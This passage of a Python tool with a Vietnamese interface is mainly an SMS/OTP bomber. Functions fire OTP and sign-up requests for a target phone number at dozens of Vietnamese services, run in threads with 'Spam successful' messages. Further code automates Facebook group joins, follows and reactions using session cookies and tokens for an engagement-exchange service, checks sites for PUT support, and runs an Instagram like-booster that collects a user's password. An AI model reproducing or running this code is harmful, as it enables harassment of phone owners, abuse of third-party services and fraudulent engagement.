    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://sso.ghn.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt","type":"register"}'.replace("sdt",sdt)
  response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data).json()

def best_inc(sdt):
  headers = {
    'Host': 'v9-cc.800best.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '53',
    'x-timezone-offset': '7',
    'x-auth-type': 'web-app',
    'x-nat': 'vi-VN',
    'x-lan': 'VI',
    'authorization': 'null',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': 'application/json',
    'lang-type': 'vi-VN',
    'Origin': 'https://best-inc.vn',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://best-inc.vn/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt",sdt)
  response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode',data=data,headers=headers).text

def sapo(sdt):
  headers = {
    'Host': 'www.sapo.vn',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://www.sapo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
    }
  data = {
    'phonenumber': f'{sdt}',
  }
  response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()

def findo(sdt):
  headers = {
    'Host': 'api.findo.vn',
    # 'content-length': '39',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.findo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.findo.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"mobilePhone":{"number":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, data=data).text

def beecow(sdt):
  headers = {
    'Host': 'api.beecow.com',
    # 'content-length': '138',
    'content-type': 'application/json; text/plain',
    'accept': 'application/json, text/plain, application/stream+json',
    'ati': '1467350218617',
    'platform': 'WEB',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'time-zone': 'Asia/Saigon',
    'origin': 'https://admin.gosell.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://admin.gosell.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"password":"12345ccok@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data).text
def cashberry(sdt):
  letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
  random1 = random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters)
  for x in random1:
    a = x+"@gmail.com" 
  headers = {
    'Host': 'cashberry.vn',
    # 'content-length': '1170',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://cashberry.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://cashberry.vn/dang-ky',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'cashberry_new_nuxt_front=vn; site_id=1f21f685be4e9ac1d9dde54d64a5ee30; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=wLU0zLsWJMCSuaFRsEAMR9lS8ymsmsZlauYDdKY58gA=; _ga=GA1.1.453475758.1691890639; _fbp=fb.1.1691890639098.1672690554; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1691890639757}; _lr_uf_-bdwvky=6e4dc5a7-23fc-4687-9efe-b0d1ea7ebdf2; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-5d2ee190-bf44-4420-bbcf-69d94bc1229c%22%2C%22webViewID%22:null%2C%22lastActivity%22:1691890645656}; _ga_53M1222GXQ=GS1.1.1691890638.1.1.1691890649.0.0.0',
}
  data = '{"phone":"sdt","inn":"583805682558","email":"email11","password":"12345Gdtg@","password_repeat":"12345Gdtg@","agree":true,"is_confirmed_kyivstar":1,"email_mailing":1,"registrationActionsReport":{"Object_1":{"Keypress":null,"Activate":1,"TimeLast":3,"TimeAll":60,"SymbolFact":10,"Copy":null,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":17},"Object_2":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":19,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":4},"Object_3":{"Activate":1,"TimeLast":6,"TimeAll":6,"SymbolFact":10,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":null},"Object_15":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":null,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":null},"Object_41":{"Activate":null,"Changes":null,"Error":null}}}'.replace('email11',a)
  data = data.replace('sdt',sdt)
  response = requests.post('https://cashberry.vn/proxy/user/register', headers=headers, data=data).text

def kimungvay(sdt):
  headers = {
    'Host': 'api.kimungvay.co',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.kimungvay.site',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.kimungvay.site/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}

  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
}
  response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data).text

def xoa(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()

# hàm chạy
def idelay(o):
    while(o>0):
        o=o-1
        print(f"\033[1;33mV\033[1;34mu\033[1;35mi \033[1;32mL\033[1;33mò\033[1;34mn\033[1;35mg \033[1;36mC\033[1;33mh\033[1;34mờ[\033[1;35m.....""]""["+str(o)+"]""    ",end='\r')
        time.sleep(1/6)
        print(f"\033[1;31mV\033[1;32mu\033[1;33mi \033[1;34mL\033[1;35mò\033[1;31mn\033[1;32mg \033[1;33mC\033[1;32mh\033[1;35mờ[\033[1;33m•....""]""["+str(o)+"]""     ",end='\r')
        time.sleep(1/6)
        print(f"\033[1;32mV\033[1;33mu\033[1;34mi \033[1;35mL\033[1;36mò\033[1;33mn\033[1;34mg \033[1;35mC\033[1;31mh\033[1;32mờ[\033[1;35m••...""]""["+str(o)+"]""     ",end='\r')
        time.sleep(1/6)
        print(f"\033[1;31mV\033[1;33mu\033[1;35mi \033[1;33mL\033[1;31mò\033[1;32mn\033[1;34mg \033[1;36mC\033[1;35mh\033[1;31mờ[\033[1;32m•••..""]""["+str(o)+"]""     ",end='\r')
        time.sleep(1/6)
        print(f"\033[1;32mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;31mn\033[1;35mg \033[1;33mC\033[1;36mh\033[1;35mờ[\033[1;38m••••.""]""["+str(o)+"]""     ",end='\r')
        time.sleep(1/6)
        print(f"\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')
        time.sleep(0.1)
        print(f"\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')



def run(sdt,i):
  threading1.submit(regthantaioi,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(sapo,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(onecredit,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(y360,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(tv360,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(winmart,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(apispam,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(vieon,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(poyeye,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(alfrescos,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(fpt,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(kiot,sdt) # ok
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(vayvnd,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(viettel,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(tamo,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(meta,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(funring,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(dkvt,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(fptplay,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(vietid,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(phamacy,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(y360rs,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(concung,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(appota,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(pizzacompany,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(best_inc,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(shopiness,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(ghn,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(chotot,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(cashbar,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(ubofood,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(bibabo,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(itaphoa,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(findo,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(beecow,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(cashberry,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(takomo,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(kimungvay,sdt)
  print(f"{xanh_la}Spam thành công")
  time.sleep(1)
  threading1.submit(thantaioi)
  print(f"{xanh_la}Spam thành công")
#=========================================================================================================================================================
#==================================================================================================================================================================
def check_put_method(url):
    try:
        response = requests.request('PUT', url)
        if response.status_code == 200:
            print(f"{xanh_la}Website \033[4m{url} có hỗ trợ PUT")
        else:
            print(f"{do}Website \033[4m{url} không hỗ trợ PUT")
    except requests.exceptions.RequestException as e:
        print(f"Lỗi: {url}: {e}")
#===================================================================================================================================================================

#==================================================================================================================================================================
headers = {
    'authority': 'traodoisub.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'user-agent': 'traodoisub tiktok tool',
}
class ApiPro5:
    
    def __init__(self, cookies,fb_dtsg,jazoet,id_page) -> None:
        self.headers = {
                'authority': 'www.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'vi',
                'cookie': cookies,
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'viewport-width': '1366',
            }
        url_profile = requests.get('https://www.facebook.com/me', headers=self.headers).url
        profile = requests.get(url_profile, headers=self.headers).text
        self.fb_dtsg = fb_dtsg
        self.jazoet = jazoet
        self.user_id = id_page
    def join(self, group_id):
        data = {
            'fb_dtsg': self.fb_dtsg,
            'jazoest': self.jazoet,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
            'variables': '{"feedType":"DISCUSSION","groupID":"'+group_id+'","imageMediaType":"image/x-auto","input":{"action_source":"GROUPS_ENGAGE_TAB","attribution_id_v2":"GroupsCometCrossGroupFeedRoot.react,comet.groups.feed,tap_tabbar,1667116100089,433821,2361831622,","group_id":"'+group_id+'","group_share_tracking_params":null,"actor_id":"'+self.user_id+'","client_mutation_id":"2"},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":false,"scale":1,"source":"GROUPS_ENGAGE_TAB","renderLocation":"group_mall","__relay_internal__pv__GlobalPanelEnabledrelayprovider":false,"__relay_internal__pv__GroupsCometEntityMenuEmbeddedrelayprovider":true}',
            'server_timestamps': 'true',
            'doc_id': '5915153095183264',
        }

        response = requests.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).text
        return response 
    def subscribe(self, uid):
        data = {
            'fb_dtsg': self.fb_dtsg,
            'jazoest': self.jazoet,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'CometUserFollowMutation',
            'variables': '{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1667114418950,431532,190055527696468,","subscribe_location":"PROFILE","subscribee_id":"'+uid+'","actor_id":"'+self.user_id+'","client_mutation_id":"1"},"scale":1}',
            'server_timestamps': 'true',
            'doc_id': '5032256523527306',
        }
        subscribe = requests.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).text
        return subscribe
    def reaction(self, id_post, reaction):
        try:
            url = requests.get('https://www.facebook.com/'+id_post, headers=self.headers).url
            home = requests.get(url, headers=self.headers).text
            feedback_id = home.split('{"__typename":"CommentComposerLiveTypingBroadcastPlugin","feedback_id":"')[1].split('","')[0]
            data = {
                'fb_dtsg': self.fb_dtsg,
                'jazoest': self.jazoet,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
                'variables': '{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1667106623951,429237,190055527696468,","feedback_id":"'+feedback_id+'","feedback_reaction_id":"'+reaction+'","feedback_source":"PROFILE","is_tracking_encrypted":true,"tracking":["AZXg8_yM_zhwrTY7oSTw1K93G-sycXrSreRnRk66aBJ9mWkbSuyIgNqL0zHEY_XgxepV1XWYkuv2C5PuM14WXUB9NGsSO8pPe8qDZbqCw5FLQlsGTnh5w9IyC_JmDiRKOVh4gWEJvLong DecTdTOYlGT7k5vUcSrvUk7lJ-DXs3YZsw994NV2tRrv_zq1SuYfVKqDboaAFSD0a9FKPiFbJLSfhJbi6ti2CaCYLBWc_UgRsK1iRcLTZQhV3QLYfYOLxcKw4s2b1GeSr-JWpxu1acVX_G8d_lGbvkYimd3_kdh1waZzVW333356_JAEiUMU_nmg7gd7RxDv72EkiAxPM6BA-ClqDcJ_krJ_Cg-qdhGiPa_oFTkGMzSh8VnMaeMPmLh6lULnJwvpJL_4E3PBTHk3tIcMXbSPo05m4q_Xn9ijOuB5-KB5_9ftPLc3RS3C24_7Z2bg4DfhaM4fHYC1sg3oFFsRfPVf-0k27EDJM0HZ5tszMHQ"],"session_id":"'+str(uuid.uuid4())+'","actor_id":"'+self.user_id+'","client_mutation_id":"1"},"useDefaultActor":false,"scale":1}',
                'server_timestamps': 'true',
                'doc_id': '5703418209680126',
            }

            reaction = requests.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).text
            return {'status': True, 'url': url}
        except:
            return {'status': False, 'url': url}
    
def get_page(cookie):
    headers = {
        'authority': 'mbasic.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
        'cache-control': 'max-age=0',
        'cookie': cookie,
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    }
    response = requests.get('https://mbasic.facebook.com/',headers=headers).text
    fb_dtsg = response.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
    jazoest = response.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
    idpef = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'variables': '{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}','doc_id': '5300338636681652'}).json()
    a = idpef['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
    sl = 0
    for b in a:
        sl +=1
        uid = b['profile']['id']
        name = b['profile']['name']
        delegate_page_id = b['profile']['delegate_page_id']
        print (f"{xanh_la}PAGE {trang}: {vang}{sl} {trang}| {xanh_la}ID {trang}: {vang}{uid} {trang}| {xanh_la}Name {trang}: {vang}{name} ")
    return a
def get_data(cookie):
    headers = {
        'authority': 'mbasic.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'cookie': cookie,
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    }

    response = requests.get('https://mbasic.facebook.com/',headers=headers).text
    fb_dtsg = response.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
    jazoet = response.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
    return json.dumps({'fb_dtsg':fb_dtsg,'jazoet':jazoet})

def login_tds(token):
    try:
        r = requests.get('https://traodoisub.com/api/?fields=profile&access_token='+token, headers=headers, timeout=5).json()
        if 'success' in r:
            
            print(f"{xanh_la}Đăng nhập thành công!\n {xanhnhat}User{trang}: {vang}{r['data']['user']} {trang}| {xanhnhat}Xu hiện tại{trang}: {vang}{r['data']['xu']}")
            return r
        else:
            print(f"{do}Token TDS không hợp lệ, hãy kiểm tra lại!\n")
            return 'error_token'
    except:
        return 'error'

def load_job(type, TDS_token):
        r = requests.get(f'https://traodoisub.com/api/?fields={type}&access_token={TDS_token}')


def type_cx(type_1) :
    if type_1 == "LOVE" :
        type_2 = '1678524932434102'
    elif type_1 == "CARE" :
        type_2 = '613557422527858'
    elif type_1 == "WOW" :
        type_2 = '478547315650144'
    elif type_1 == "HAHA" :
        type_2 = '115940658764963'
    elif type_1 == "SAD" :
        type_2 = '908563459236466'
    elif type_1 == "ANGRY" :
        type_2 = '444813342392137'
        
    return type_2
def cau_hinh(id, TDS_token, name):
    urlch = f"https://traodoisub.com/api/?fields=run&id={id}&access_token={TDS_token}'"
    ch = requests.get( url=urlch)
    try: 
        checkch = ch.json()["data"]["msg"]
        print(f"{xanh_la}Cấu Hình {trang}| {xanh_la}ID {trang}: {vang}{id} {trang}| {xanh_la}Name {trang}: {vang}{name} \033[0m")
    except:
        print(f"{do}Cấu Hình Thất Bại {vang}{id} ")
        exit ()

def chon_job(so,chon):
    if chon == 1 :
        if so == 4 :
            so -= 4 
        else :
            type = ['like','likegiare','likesieure','reaction']
            job = type[so]
    elif chon == 2 :
        job = "group"
    elif chon == 3 :
        job = "follow"
    elif chon == 4:
        if so == 5 :
            so -= 5 
        else :
            type = ['like','likegiare','likesieure','reaction','group']
            job = type[so]
    else :
        if so == 6 :
            so -= 6 
        else :
            type = ['like','likegiare','likesieure','reaction','group','follow']
            
            job = type[so]
    return job



#===================================================================================================================================================================
#=======================================================================================================
def download_file(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as file:
            file.write(response.content)

#============================================================================================================================================================================
Sukses, Gagal, Jumlah = [], [], {
    "Count": 0
}
class Main:

    def __init__(self) -> None:
        pass

    def Pengguna(self):
        try:
            with requests.Session() as r:
                response = r.get('https://justpaste.it/4p16t')
                self.online = re.search('"onlineText":"(\d+)"', str(response.text)).group(1)
                self.jumlah = re.search('"viewsText":"(.*?)"', str(response.text)).group(1)
            return (self.jumlah, self.online)
        except (Exception) as e:
            return (404, 404)

    def Your_Username_Password(self):
        try:
            clear()
            runbanner(chontool)
            print(f"{trang}Vui lòng nhập Username và Password tài khoản Instagram của bạn được chia bởi kí tự {trang}\"{xanh_la}/{trang}\" \n{tim}eg{trang}: vLong Decsocute{xanh_la}/{trang}vLong Dec123 (vLong Decsocute{tim}={vang}Username {do}| {trang}vLong Dec123{tim}={vang}Password{trang})")
            your_username_password = input(f"{xanhnhat}   ╰─>{vang} ")
            if '/' in str(your_username_password):
                clear()
                runbanner(chontool)
                self.username, self.password = your_username_password.split('/')[0], your_username_password.split('/')[1]
                print(f"{trang}Vui lòng nhập liên kết bài đăng trên Instagram \nví dụ:{xanh_la} https://www.instagram.com/p/CxC097Pvma5/")
                your_postingan = input(f"{xanhnhat}   ╰─>{vang} ").replace('/reel/', '/p/').replace('/reels/', '/p/')
                self.link_split = your_postingan.split('https://www.instagram.com/p/')[1]
                if '/' in str(self.link_split):
                    self.code_postingan = (self.link_split.split('/')[0])
                else:
                    self.code_postingan = (self.link_split)
                clear()
                runbanner(chontool)
                self.final_postingan = (f'https://www.instagram.com/p/{self.code_postingan}/')
                print(f"{trang}Đang tăng lượt thích mà bạn có thể sử dụng{xanh_la} CTRL + C{trang} để dừng hoặc {do} CTRL + Z{trang} để dừng!")
                while True:
                    try:
                        self.status, self.media_ids = self.Submit_Likes(self.username, self.password, self.final_postingan)
                        if Jumlah['Count'] > 20:
                            Sukses.append(Jumlah['Count'])
                            print(f"""{trang}Status :{xanh_la} Successfully sent likes...[/]
{trang}Link :{do} {str(self.final_postingan)[:49]}
{trang}Jumlah :{xanh_la} +{Jumlah['Count']}{vang} *Successful""")
                            Jumlah.update({
                                "Count": 0
                            })
                            continue
                        else:
                            if 'Likes Limit' in str(self.status):
                                self.Delay(0, 3600, self.media_ids)
                                continue
                            else:
                                continue
                    except (KeyboardInterrupt):
                        print("\r                                                    ", end='\r')
                        time.sleep(1.5)
                        continue
                    except (RequestException):
                        print("\r                                                    ", end='\r')
                        time.sleep(1.5)
                        print(f"{xanhnhat}   ╰─>{do} KẾT NỐI CÓ VẤN ĐỀ!", end='\r')
                        time.sleep(4.5)
                        continue
                    except (Exception) as e:
                        print("\r                                                    ", end='\r')
                        time.sleep(1.5)
                        print(f"{xanhnhat}   ╰─>{do} {str(e).upper()}!", end='\r')
                        time.sleep(4.5)
                        continue
            else:
                print(f"{do}Dấu tách tên người dùng hoặc mật khẩu của bạn đã nhập bị sai!")
                exit()
        except (Exception) as e:
            print(f"{do}{str(e).title()}!")
            exit()

    def Submit_Likes(self, username, password, your_links):
        global Sukses, Jumlah, Gagal
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'connection': 'keep-alive',
